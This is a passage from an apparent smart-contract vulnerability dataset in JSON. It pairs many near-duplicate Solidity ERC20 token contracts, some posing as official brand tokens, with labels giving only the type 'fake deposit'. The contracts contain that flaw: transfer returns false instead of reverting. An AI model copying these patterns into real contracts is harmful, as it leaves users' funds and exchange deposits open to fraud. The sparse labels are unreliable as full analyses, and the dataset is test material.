payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'ShibaInuBadger' token contract\r\n//\r\n// Symbol      : SHIB \ud83e\udda1\r\n// Name        : Shiba Inu Badger\r\n// Total supply: 100000000000000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract ShibaInuBadger is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Shiba Inu Badger\";\r\n    string public constant symbol = \"SHIB \ud83e\udda1\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;\r\n        totalSupply = 1000000000;\r\n        name = \"Can Swap\";\r\n        decimals = 0;\r\n        symbol = \"CAN\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'McAfeeGhost' token contract\r\n//\r\n// Symbol      : AGHOST \ud83d\udc7b\r\n// Name        : McAfee Ghost\r\n// Total supply: 100,000,000,000,000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract McAfeeGhost is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000000000*10**uint256(decimals);\r\n    string public constant name = \"McAfee Ghost\";\r\n    string public constant symbol = \"AGHOST \ud83d\udc7b\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000;\r\n        totalSupply = 10000000;\r\n        name = \"Nude NFT\";\r\n        decimals = 0;\r\n        symbol = \"NUDE\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract SHIBA_INU_2 is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000*10**uint256(decimals);\r\n    string public constant name = \"SHIBA INU 2\";\r\n    string public constant symbol = \"SHIB2\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract SpongebobSquarepantsToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Spongebob Squarepants Token\";\r\n    string public constant symbol = \"SPONGE \ud83e\uddfd\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract TwitterOfficial is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000000000*10**uint256(decimals);\r\n    string public constant name = \"Twitter Token (Official)\";\r\n    string public constant symbol = \"TTKN\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Teenage_Mutant_Ninja_Turtles_Finance is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 2100000*10**uint256(decimals);\r\n    string public constant name = \"Teenage Mutant Ninja Turtles Finance\";\r\n    string public constant symbol = \"TMNT\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\ncontract eBayToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"eBay Token (Official)\";\r\n    string public constant symbol = \"EBAY\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Diamond_Shiba_Inu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Diamond Shiba Inu\";\r\n    string public constant symbol = \"DINU\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.12;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract JuneteenthToken is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function JuneteenthToken(\r\n        ) {\r\n        balances[msg.sender] = 100000000000000 * 10**10;\r\n        totalSupply = 100000000000000 * 10**10;\r\n        name = \"Juneteenth Token\";\r\n        decimals = 10;\r\n        symbol = \"JUNETEENTH\";\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
